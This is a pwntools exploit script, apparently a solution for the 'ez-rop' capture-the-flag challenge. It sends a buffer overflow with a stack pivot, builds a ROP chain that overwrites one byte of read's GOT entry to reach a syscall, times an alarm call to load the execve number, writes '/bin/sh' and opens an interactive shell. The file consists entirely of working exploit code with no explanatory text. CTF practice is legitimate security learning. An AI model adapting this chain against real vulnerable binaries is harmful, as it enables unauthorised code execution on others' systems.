from pwn import *

if args.REMOTE:
    io = remote("ez-rop.challs.csc.tf", 1337)
else:
    io = process("./chall_patched")

gdbscript = """
# b* 0x1555553fd741 
b* 0x401183 
c
c
c
""".format(
    **locals()
)

exe = "./chall_patched"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "info"
context(terminal=["tmux", "split-window", "-h"])
# libc = ELF("./libc.so.6", checksec=False)

# setup
rop = ROP(elf)
be = int(time.time())
pop_rsi = rop.find_gadget(["pop rsi", "ret"])[0]
pop_rbp = rop.find_gadget(["pop rbp", "ret"])[0]
leave_ret = rop.find_gadget(["leave", "ret"])[0]
mov_rdi_rsi = 0x40115A
read = 0x401172
target = 0x404F90  # 0x404a00
buf = 0x404F30  # 0x4049a8-8

# stack pivot
payload = flat(b"A" * 0x60, target, 0x40119A)
io.sendline(payload)
##
payload = flat(
    0x404800 + 8, # write /bin/sh
    read,
    pop_rbp,  0x404010 + 8, # overwrite 1 byte in read.
    # when we call read.plt will execute syscall (need brute-force)
    read,
    elf.plt.alarm, # alarm to set up rax 0x3b
    pop_rsi, 0x404800, mov_rdi_rsi, 
    pop_rsi, 0,
    elf.plt.read, # syscall
)
payload = payload.ljust(0x60)
payload += flat(buf, leave_ret)
io.sendline(payload)

sleep(3)
io.send(b"/bin/sh\x00")
af = int(time.time())

sleep_time = 0x50 - 0x3B - (af - be)
log.info(f"Sleep time: {sleep_time}")
sleep(sleep_time)

io.send(p8(0x41))
io.interactive()